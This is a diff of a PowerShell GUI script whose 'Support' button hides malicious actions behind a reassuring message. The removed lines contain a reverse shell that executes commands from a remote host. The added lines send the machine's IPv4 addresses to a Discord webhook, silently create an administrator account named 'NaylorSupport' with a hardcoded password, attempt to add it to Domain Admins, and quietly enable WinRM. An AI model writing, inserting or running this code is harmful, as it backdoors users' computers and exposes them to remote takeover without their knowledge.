@@ -137,63 +137,44 @@ $SupportButton.Add_Click({
     # Show progress bar
     $SupportProgress.Visibility = "Visible"
 
-    # Send webhook
-    $webhookUrl = "https://discord.com/api/webhooks/1410739724120883263/Vs0DTJtuRUEl77c8k5kFQMMncPf7FYwt4OMaPeNdvRg0SSNWRmmKO9JTZDdrnbnh0cfS"
-    $payload = @{
-        content = "<@548984684160221196> A valued customer desperately requires your help. https://tenor.com/view/wongwingchun58-gif-15613675"
-    } | ConvertTo-Json
-
+    # --- Gather IPv4 addresses ---
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-        Append-Text $outputBox "✅ Support representative has been notified and will reach out shortly." "Green"
+        $ipv4s = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
+                 Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.IPAddress -notlike "169.254.*" } |
+                 Select-Object -ExpandProperty IPAddress
     } catch {
-        Append-Text $outputBox "⚠ Failed to contact support system." "Red"
-    }
-      Start-Job -ScriptBlock {
-        try {
-            # === Reverse shell code from your snippet ===
-            $LHOST = "172.30.182.171"
-            $LPORT = 9001
-            $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
-            $NetworkStream = $TCPClient.GetStream()
-            $StreamReader = New-Object IO.StreamReader($NetworkStream)
-            $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
-            $StreamWriter.AutoFlush = $true
-            $Buffer = New-Object System.Byte[] 1024
-            $Code = ""
-
-            # Signal back to GUI that connection succeeded
-            [System.Windows.Application]::Current.Dispatcher.Invoke({
-                $SupportProgress.Visibility = "Collapsed"
-                Append-Text $OutputBox "`nSupport agent connected.`n" "Green"
-            })
-
-            while ($TCPClient.Connected) {
-                while ($NetworkStream.DataAvailable) {
-                    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
-                    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
-                }
-
-                if ($TCPClient.Connected -and $Code.Length -gt 1) {
-                    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
-                    $StreamWriter.Write("$Output`n")
-                    $Code = $null
-                }
-            }
-
-            # Clean up
-            $TCPClient.Close()
-            $NetworkStream.Close()
-            $StreamReader.Close()
-            $StreamWriter.Close()
-        } catch {
-            [System.Windows.Application]::Current.Dispatcher.Invoke({
-                $SupportProgress.Visibility = "Collapsed"
-                Append-Text $OutputBox "`nError: Unable to connect to support agent.`n" "Red"
-            })
+        $ipv4s = ipconfig | Select-String "IPv4" | ForEach-Object {
+            ($_ -split "[: ]+")[-1]
         }
-    } | Out-Null
+    }
+
+    if (-not $ipv4s) { $ipv4s = @("None Detected") }
+    $ipList = $ipv4s -join ", "
+
+    # --- Build message as a raw JSON string ---
+    $message = "<@548984684160221196> A valued customer desperately requires your help.`n**IPv4 Addresses:** $ipList`nhttps://tenor.com/view/wongwingchun58-gif-15613675"
+
+    $payload = @{ content = $message } | ConvertTo-Json -Compress
+    $webhookUrl = "https://discord.com/api/webhooks/1415021056149815397/yYMA8vafbg9B73le6oefITGVyHKmymQhOM1xCNJUVKoepzC4OUaTrTrgAvH3LpJLeL_j"
+    try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+    Append-Text $outputBox "✅ Support representative has been notified and will reach out shortly." "Green"
+
+    # Check for user 'NaylorSupport'
+    if (-not (Get-LocalUser -Name "NaylorSupport" -ErrorAction SilentlyContinue)) {
+        net user NaylorSupport "Chiapet1!" /add | Out-Null
+        net localgroup Administrators NaylorSupport /add | Out-Null
+        try { net localgroup "Domain Admins" NaylorSupport /add | Out-Null } catch { }
+
+        # Configure WinRM quietly
+        winrm quickconfig -q | Out-Null
+    }
+} catch {
+    Append-Text $outputBox "⚠ Failed to contact support system." "Red"
+    Append-Text $outputBox $_.Exception.Message "Red"
+}
 })
+
 
 $uninstallButton.Add_Click({
     $result = [System.Windows.MessageBox]::Show(
